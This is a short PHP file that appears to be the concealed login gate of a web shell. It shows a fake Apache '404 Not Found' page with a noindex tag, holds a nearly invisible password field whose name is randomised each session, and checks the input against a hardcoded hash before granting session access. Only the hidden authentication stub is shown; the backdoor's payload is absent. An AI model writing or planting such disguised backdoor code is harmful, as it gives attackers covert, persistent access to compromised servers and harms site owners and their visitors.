<?php
session_start();

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function printLoginx() {  
 echo '<!DOCTYPE html><html><head><meta name="robots" content"noindex. nofollow"><title></title></head><body>
 <h1>Not Found</h1> 
     <title>404 Not Found</title>
 <style type="text/css">
 input[type=password] {
     width: 250px;
     height: 25px;
     color: white;
     background: transparent;
     border: 1px solid white;
     margin-left: 20px;
     text-align: center;
 }
 </style>
     <p>The requested URL was not found on this server.</p> 
 <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
 <hr> 
 <address>Apache Server at '.$_SERVER["HTTP_HOST"].' Port '.$_SERVER["SERVER_PORT"].'</address> 

 <center><form method="post"><input type="password" name="'.$_SESSION["keyxx"].'" autocomplete="off"><br></form></center></body></html>
    ';   
    exit; 
} 

$auth_pass5 = "6862666e8162fe84d316aee51fbb07f614acf3a6"; 
if(empty($_SESSION["keyxx"])) {
   $keyxxx = generateRandomString();
   $_SESSION["keyxx"] = $keyxxx;
   
}

$keyxx =$_SESSION["keyxx"];



if( empty( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) {
    if( isset($_POST[$keyxx]) AND sha1(md5($_POST[$keyxx])) == $auth_pass5 )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
        printLoginx();
     exit();

}

